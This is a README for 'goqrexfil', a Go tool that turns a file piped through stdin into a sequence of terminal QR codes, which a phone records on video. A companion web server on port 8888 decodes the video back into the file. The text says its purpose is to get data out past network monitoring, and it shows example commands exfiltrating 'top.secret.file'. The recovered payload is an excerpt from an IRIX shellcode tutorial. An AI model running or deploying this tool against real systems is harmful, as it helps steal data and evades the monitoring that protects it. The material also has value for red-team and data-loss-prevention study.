# goqrexfil
 A mini project to exfiltrate data via QR codes - I just like writing code around data exfiltration. 
 
 The whole idea in this one is that the data can be exfiltrated via a different cover channel using video recording device and therefore will not trigger any classic network monitoring alerts.
 
 In a first phase using --client, the code allows to take a file from stdin, cut it in pieces and display chunks as QR codes one at a time in your terminal. This allows you to create a video on your phone, just ensure that you are zooming and have the whole terminal in your focus.
 
 In a second phase using --server, you can use the same code elsewhere on a system you control and run a web server that will allow you to upload your video for processing. We rely on ffmpeg to extract frames from the recording and then a library to extract QR codes from the frames (minus potential duplicates). Finally, the payload is rebuilt from being retrieved by reading the data from the QR codes and a file is created with the original data.
 
# Caveats/TODO
* Currently very Alpha - works well with small text files, almost ok for PDFs/binary format (I need to have more time to debug this)
* Ugly code - I am not a developper, I normally use Python and wanted to try to learn Golang (be nice if you want to help with improving this ugly code)
 
# Example
## Part 1: Convert file into QR codes and video record
1. use goqrexfil in client mode 
2. start a video recording with phone, point at the shell window

Example:
```
➜ cat top.secret.file | ./goqrexfil --client
-= goqrexfil =-
[*] Client mode: ON
[*] Payload is in 8 chunks, video recording time estimate:


---=== 5 seconds to use CTRL+C if you want to abort ===---
```
Start recording a video now, QR codes will be displayed on the console and stop the video at the end.

## Have server ready to receive and process your video
1. use goqrexfil in server mode
2. From your phone, go to your server domain/ip on port 8888 e.g. http://1.2.3.4:8888/ and upload the video:

Example:
```➜ ./goqrexfil -server
-= goqrexfil =-
[*] Server mode: ON
2020/04/25 11:42:15
[*] File received
[*] Frames extracted

public/004.png has payload.. Adding
public/005.png has payload.. Adding

[*] Payload retrieved (Wrote 824 bytes): payload.raw.
[GIN] 2020/04/25 - 11:42:19 | 200 |  4.336634181s |    172.16.0.110 | POST     "/upload"

^C⏎
```

## Retrieving payload
```➜ cat payload.raw
------------|


----|  Intro

Writing shellcode for the MIPS/Irix platform is not much different from writing
shellcode for the x86 architecture.  There are, however, a few tricks worth
knowing when attempting to write clean shellcode (which does not have any NULL
bytes and works completely independent from it's position).

This small paper will provide you with a crash course on writing IRIX
shellcode for use in exploits.  It covers the basic stuff you need to know to
start writing basic IRIX shellcode.  It is divided into the following sections:

    - The IRIX operating system
    - MIPS archstages the MIPS design
      has reflected this on the instructions itself: every instruction is
      32 bits broad (4 bytes), and can be divided most of the times into
      segments which correspond with each pipestage..```
